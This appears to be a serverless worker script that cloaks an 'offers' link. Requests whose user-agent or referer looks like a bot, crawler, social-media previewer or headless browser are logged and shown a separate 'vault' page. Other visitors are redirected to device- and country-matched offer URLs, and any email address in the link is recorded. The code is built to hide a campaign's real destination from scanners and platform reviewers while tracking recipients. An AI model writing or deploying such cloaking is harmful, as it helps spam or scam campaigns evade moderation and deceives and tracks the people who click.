import { vaultHandler } from './vault';

export async function offersHandler(request, env, ctx) {
  const url = new URL(request.url);
  const ua = request.headers.get('user-agent') || '';
  const referer = request.headers.get('referer') || '';
  const botPattern = /bot|crawler|spider|facebook|twitter|linkedin|headless/i;

  if (botPattern.test(ua) || botPattern.test(referer)) {
    try {
      await env.BOT_LOG_KV.put(`bot:${Date.now()}`, JSON.stringify({
        path: url.pathname,
        ip: request.headers.get('cf-connecting-ip'),
        ua,
        country: request.headers.get('cf-ipcountry') || 'unknown',
        ts: new Date().toISOString()
      }));
    } catch (err) {
      console.error('Bot log failed', err);
    }
    return vaultHandler(request, env, ctx);
  }

  const device = /iPhone|iPad|iPod/.test(ua) ? 'iOS' : /Android/.test(ua) ? 'Android' : 'Desktop';
  const geo = request.headers.get('cf-ipcountry') || 'US';

  let offers = [];
  try {
    const resp = await fetch(new URL(env.OFFERS_PATH, request.url));
    offers = await resp.json();
  } catch (err) {
    console.error('Offer load failed', err);
  }

  let offer = offers.find(o => (o.device === device || o.device === 'all') && o.geo.includes(geo));
  if (!offer) {
    offer = offers[0];
  }

  try {
    await env.BOT_LOG_KV.put(`sv:${Date.now()}`, JSON.stringify({
      email: url.searchParams.get('email'),
      offer: offer ? offer.name : 'none',
      device,
      geo,
      ts: new Date().toISOString()
    }));
  } catch (err) {
    console.error('Redirect log failed', err);
  }

  if (offer && offer.url) {
    return Response.redirect(offer.url, 302);
  }

  return vaultHandler(request, env, ctx);
}
